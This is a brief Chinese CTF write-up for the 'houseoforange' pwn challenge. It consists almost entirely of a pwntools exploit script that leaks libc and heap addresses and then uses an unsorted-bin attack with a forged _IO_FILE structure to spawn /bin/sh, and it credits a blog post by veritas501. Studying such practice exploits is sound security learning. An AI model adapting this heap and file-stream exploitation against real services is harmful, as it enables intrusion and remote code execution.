# Houseoforange

看着veritas501大佬的博客调的，（流下了没技术的眼泪.jpg

exp:

```python
from pwn import *

context.arch = "amd64"

def cmd(command):
	p.recvuntil("Your choice : ")
	p.sendline(str(command))

def build(len,name,price,color):
	cmd(1)
	p.recvuntil("Length of name :")
	p.sendline(str(len))
	p.recvuntil("Name :")
	p.send(name)
	p.recvuntil("Price of Orange:")
	p.sendline(str(price))
	p.recvuntil("Color of Orange:")
	p.sendline(str(color))
def see():
	cmd(2)
	
def upgrade(len,name,price,color):
	cmd(3)
	p.recvuntil("Length of name :")
	p.sendline(str(len))
	p.recvuntil("Name:")
	p.send(name)
	p.recvuntil("Price of Orange:")
	p.sendline(str(price))
	p.recvuntil("Color of Orange:")
	p.sendline(str(color))

def main(host,port=10001):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./houseoforange")
		gdb.attach(p)
	#leak
	build(0xb0,"A",1,1)
	payload = "A"*0xb0+p64(0)+p64(0x21)+"\x00"*0x10+p64(0)+p64(0xf01)
	upgrade(0x110,payload,1,1)
	
	build(0x1000,"B",1,1)
	
	build(0x400,"C",1,1)
	
	see()
	p.recvuntil("Name of house : ")
	libc.address = u64(p.recv(6).ljust(8,"\x00"))-0x3c5143
	
	upgrade(0x18,"A"*0x18,1,1)
	see()
	p.recvuntil("Name of house : "+"A"*0x18)
	heap = u64(p.recv(6).ljust(8,"\x00"))-0x160
	
	info("libc : " + hex(libc.address))
	info("heap : " + hex(heap))
	
	#unsortbin_attack
	
	payload = "A"*0x400
	payload += p64(0)+p64(0x21)
	payload += p32(0x1f)+p32(0x1)+p64(0)
	
	# way 1
	# fake_stream = "/bin/sh\x00"+p64(0x61)
	# fake_stream += p64(0)+p64(libc.symbols["_IO_list_all"]-0x10)
	# fake_stream = fake_stream.ljust(0xa0,'\x00')
	# fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
	# fake_stream += p64(heap+0x610)   # _wide_data
	# fake_stream = fake_stream.ljust(0xc0,"\x00")
	# fake_stream += p64(1)  #_mode
	
	# way 2
	fake_stream = "/bin/sh\x00"+p64(0x61)
	fake_stream += p64(0)+p64(libc.symbols["_IO_list_all"]-0x10)
	fake_stream += p64(0)+p64(1)
	fake_stream = fake_stream.ljust(0x90,'\x00')
	# fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
	fake_stream += p64(0)   # _wide_data
	fake_stream = fake_stream.ljust(0xc0,"\x00")
	fake_stream += p64(0)  #_mode
	
	
	payload += fake_stream
	payload += p64(0)*2
	payload += p64(heap+0x670)
	payload += p64(0)*3
	payload += p64(libc.symbols["system"])

	upgrade(0x800,payload,1,1)
	
	cmd(1)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	# elf = ELF("./repeaters",checksec=False)
	main(args['REMOTE'])

```
V师傅博客[https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/](https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
